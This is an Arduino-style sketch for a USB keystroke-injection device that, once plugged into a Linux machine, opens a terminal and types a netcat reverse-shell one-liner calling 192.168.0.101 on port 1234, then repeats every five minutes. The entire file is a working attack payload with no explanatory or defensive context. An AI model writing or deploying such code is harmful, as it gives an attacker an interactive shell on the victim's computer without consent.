#include <Keyboard.h>

Keyboard kb;


void setup()
{  
    Serial.begin(9600);  
    delay(1000);
}


void loop()
{
    kb.ALT_F2();
    kb.DELAY(500);    
    kb.STRING("gnome-terminal");
    kb.DELAY(500);  
    kb.ENTER();
    kb.DELAY(1500);   
    kb.STRING("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.101 1234 >/tmp/f");
    kb.DELAY(500);  
    kb.ENTER();
    kb.DELAY(500);
    kb.CTRL_ALT_ARROW("r");
    
    kb.DELAY(300000); 
}



